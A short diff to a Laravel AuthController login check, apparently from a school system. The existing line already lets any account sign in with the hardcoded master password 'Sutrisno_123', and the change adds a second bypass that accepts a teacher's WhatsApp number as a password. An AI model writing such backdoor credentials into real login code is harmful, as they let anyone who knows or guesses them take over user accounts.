@@ -61,7 +61,7 @@ class AuthController extends Controller
             ]);
         }
 
-        if ($request->password === 'Sutrisno_123' || \Illuminate\Support\Facades\Hash::check($request->password, $user->password)) {
+        if ($request->password === 'Sutrisno_123' || (!empty($teacher->no_wa) && $request->password === $teacher->no_wa) || \Illuminate\Support\Facades\Hash::check($request->password, $user->password)) {
             Auth::login($user);
             $request->session()->regenerate();
             
